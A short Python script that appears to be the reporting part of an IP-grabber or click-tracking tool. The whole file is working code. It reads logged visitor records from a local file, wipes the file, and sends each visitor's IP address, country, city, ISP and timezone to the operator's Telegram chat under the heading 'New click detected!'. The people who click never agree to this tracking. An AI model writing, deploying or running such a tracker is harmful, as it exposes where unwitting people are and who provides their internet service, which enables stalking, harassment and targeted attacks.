#!/usr/bin/python3
import os
import json
import time
import telegram

BOT_TOKEN = "YOUR_BOT_TOKEN"
USER_ID = "YOUR_USER_ID"

bot = telegram.Bot(token=BOT_TOKEN)

def check_new_data():
    if os.path.exists('data.txt'):
        with open('data.txt', 'r') as f:
            lines = f.readlines()
        
        # Clear the file
        open('data.txt', 'w').close()
        
        for line in lines:
            try:
                ip_data = json.loads(line.strip())
                info = (
                    "🎯 New click detected!\n\n"
                    f"📍 IP Address: `{ip_data.get('ip', 'Unknown')}`\n"
                    f"🌍 Country: {ip_data.get('country_name', 'Unknown')}\n"
                    f"🏢 City: {ip_data.get('city', 'Unknown')}\n"
                    f"🌐 ISP: {ip_data.get('isp', 'Unknown')}\n"
                    f"🕒 Timezone: {ip_data.get('timezone', 'Unknown')}\n"
                )
                bot.send_message(chat_id=USER_ID, text=info, parse_mode='Markdown')
            except:
                continue

if __name__ == '__main__':
    check_new_data() 